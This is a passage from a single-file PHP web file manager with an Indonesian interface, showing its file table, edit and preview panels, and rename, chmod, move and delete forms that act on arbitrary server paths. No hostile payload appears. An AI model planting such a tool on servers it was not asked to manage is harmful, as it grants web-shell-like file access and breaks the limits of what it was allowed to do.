        <a href="?p=<?php echo q($cwd); ?>&sort=mtime&dir=<?php echo ($sortBy==='mtime'&&$sortDir==='asc')?'desc':'asc'; ?>">Diubah</a>
      </span>
    </div>

    <!-- Form ZIP membungkus tabel checkbox; tombol Hapus TIDAK nested (pakai form terpisah) -->
    <form method="post" action="?a=zip&p=<?php echo q($cwd); ?>" onsubmit="return confirm('Buat ZIP dari item terpilih?');">
      <?php if (ALLOW_ZIP){ ?>
      <div style="margin-bottom:8px">
        <input name="zipname" placeholder="Nama arsip.zip" value="archive_<?php echo h(date('Ymd_His')); ?>.zip">
        <button>Buat ZIP</button>
        <small class="muted">(Centang kolom paling kiri)</small>
      </div>
      <?php } ?>

      <table class="grid">
        <thead>
          <tr>
            <th>#</th><th>Nama</th><th class="right">Ukuran</th><th>Diubah</th><th>Mode</th><th>Aksi</th>
          </tr>
        </thead>
        <tbody>
          <?php
          $parent = rtrim(dirname($cwd), DIRECTORY_SEPARATOR);
          if ($parent === '' && !isWindows()) $parent = '/';
          if (strtolower($parent) !== strtolower($cwd)){ ?>
            <tr><td></td><td colspan="5"><a href="?p=<?php echo q($parent); ?>">⬆️ .. (naik)</a></td></tr>
          <?php }
          foreach ($items as $it){ $isDir=$it['is_dir']; $p=$it['path']; $n=$it['name']; ?>
          <tr>
            <td><?php if (ALLOW_ZIP){ ?><input type="checkbox" name="items[]" value="<?php echo h($n); ?>"><?php } ?></td>
            <td><?php if ($isDir){ ?>📁 <a href="?p=<?php echo q($p); ?>"><?php echo h($n); ?></a><?php } else { ?>📄 <?php echo h($n); ?><?php } ?></td>
            <td class="right"><?php echo $isDir?'-':bytesHuman($it['size']); ?></td>
            <td><?php echo h(mtimeStr($p)); ?></td>
            <td><code class="inline"><?php echo h(permString($p)); ?></code></td>
            <td class="actions">
              <?php if (!$isDir && is_readable($p)){ ?>
                <a href="?a=download&p=<?php echo q($p); ?>" title="Download">⬇️</a>
                <a href="?a=view&p=<?php echo q($p); ?>" title="View Raw" target="_blank">👁️</a>
                <!-- Edit: selalu tampil untuk file teks -->
                <?php if (isTextFile($p)){ ?><a href="?a=edit&p=<?php echo q($p); ?>" title="Edit">✏️</a><?php } ?>
              <?php } ?>
              <a href="#" onclick="doMove('<?php echo h($p); ?>');return false;" title="Pindah">📦</a>
              <a href="#" onclick="doRename('<?php echo h($p); ?>','<?php echo h($n); ?>');return false;" title="Rename">📝</a>
              <?php if (ALLOW_CHMOD){ ?><a href="#" onclick="doChmod('<?php echo h($p); ?>');return false;" title="Chmod">🔧</a><?php } ?>
              <!-- Tombol Hapus: form terpisah via JS -->
              <button type="button" class="danger" onclick="delItem('<?php echo h($p); ?>','<?php echo h($n); ?>')">🗑️</button>
            </td>
          </tr>
          <?php } if (!$items){ ?>
          <tr><td colspan="6"><em><small class="muted">Kosong / tak terbaca.</small></em></td></tr>
          <?php } ?>
        </tbody>
      </table>
    </form>
  </div>

  <?php if ($action==='edit' && is_file($path) && isTextFile($path) && is_readable($path)){ ?>
  <div class="panel" style="margin-top:10px">
    <?php $writable = is_writable($path); ?>
    <h3>Pratinjau & Edit: <?php echo h(basename($path)); ?> <?php if(!$writable) echo '<small class="muted">(read-only)</small>'; ?></h3>
    <form method="post" action="?a=save&p=<?php echo q($path); ?>">
      <input type="hidden" name="file" value="<?php echo h($path); ?>">
      <textarea name="content" rows="24" style="width:100%" spellcheck="false"><?php echo h(fileClip($path, MAX_EDIT_BYTES)); ?></textarea>
      <br><br><button class="primary">Simpan Perubahan</button> <a href="?p=<?php echo q(dirname($path)); ?>">Batal</a>
    </form>
  </div>
  <?php } elseif (is_file($path) && isImageFile($path) && is_readable($path)){ ?>
  <div class="panel" style="margin-top:10px">
    <h3>Pratinjau Gambar: <?php echo h(basename($path)); ?></h3>
    <div><img src="?a=view&p=<?php echo q($path); ?>" alt="" style="max-width:100%;height:auto;max-height:<?php echo THUMB_MAX_DIM; ?>px"></div>
  </div>
  <?php } elseif (is_file($path) && isTextFile($path) && is_readable($path)){ ?>
  <div class="panel" style="margin-top:10px">
    <h3>Pratinjau Teks: <?php echo h(basename($path)); ?></h3>
    <pre style="white-space:pre-wrap;overflow:auto;max-height:400px"><?php echo h(fileClip($path, MAX_EDIT_BYTES)); ?></pre>
  </div>
  <?php } ?>

  <footer>
    <small class="muted">
      Start: <?php echo h(START_DIR); ?> · CWD: <?php echo h($cwd); ?> · PHP <?php echo h(PHP_VERSION); ?> ·
      ZipArchive: <?php echo class_exists('ZipArchive')?'✅':'❌'; ?> · PharData: <?php echo class_exists('PharData')?'✅':'❌'; ?>
    </small>
  </footer>
</div>

<!-- Global forms (tidak nested) -->
<form id="frmRename" method="post" action="?a=rename"><input type="hidden" name="old" id="renOld"><input type="hidden" name="new" id="renNew"></form>
<form id="frmChmod"  method="post" action="?a=chmod"><input type="hidden" name="target" id="chmodTarget"><input type="hidden" name="mode" id="chmodMode"></form>
<form id="frmMove"   method="post" action="?a=move"><input type="hidden" name="src" id="mvSrc"><input type="hidden" name="dst" id="mvDst"></form>
<form id="frmDelete" method="post" action="?a=delete"><input type="hidden" name="target" id="delTarget"></form>

<div id="moveDlg" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,.5); align-items:center; justify-content:center;">
  <div style="background:#111827;border:1px solid #1f2937;padding:16px;border-radius:12px;min-width:340px">
    <div style="margin-bottom:8px"><strong>Pindahkan ke folder:</strong></div>
    <input id="mvDstInput" style="width:100%;margin-bottom:8px" placeholder="ketik path tujuan (mis. /var/www atau C:\data)" value="<?php echo h($cwd); ?>">
    <div style="display:flex; gap:8px; justify-content:flex-end">
      <button type="button" onclick="closeMove()">Batal</button>
      <button type="button" class="primary" onclick="submitMove()">Pindah</button>
    </div>
  </div>
</div>

<script>
function doRename(fullPath, currentName){
  var n = prompt('Nama baru untuk:\n' + currentName, currentName);
  if(!n) return;
  document.getElementById('renOld').value = fullPath;
  document.getElementById('renNew').value = n;
  document.getElementById('frmRename').submit();
}
function doChmod(fullPath){
  var m = prompt('Mode chmod (mis. 644, 755 atau 0755):', '0755');
  if(!m) return;
  document.getElementById('chmodTarget').value = fullPath;
  document.getElementById('chmodMode').value = m;
  document.getElementById('frmChmod').submit();
}
var mvSrcPath = null;
function doMove(fullPath){
  mvSrcPath = fullPath;
  document.getElementById('mvDstInput').value = '<?php echo h($cwd); ?>';
  document.getElementById('moveDlg').style.display = 'flex';
}
function closeMove(){ mvSrcPath = null; document.getElementById('moveDlg').style.display = 'none'; }
function submitMove(){
  if(!mvSrcPath) return;
  var dst = document.getElementById('mvDstInput').value;
  if(!dst){ alert('Path tujuan kosong'); return; }
  document.getElementById('mvSrc').value = mvSrcPath;
  document.getElementById('mvDst').value = dst;
  document.getElementById('frmMove').submit();
}
function delItem(fullPath, name){
  if(!confirm('Hapus: ' + name + ' ?')) return;
  document.getElementById('delTarget').value = fullPath;
  document.getElementById('frmDelete').submit();
}
</script>
</body>
</html>
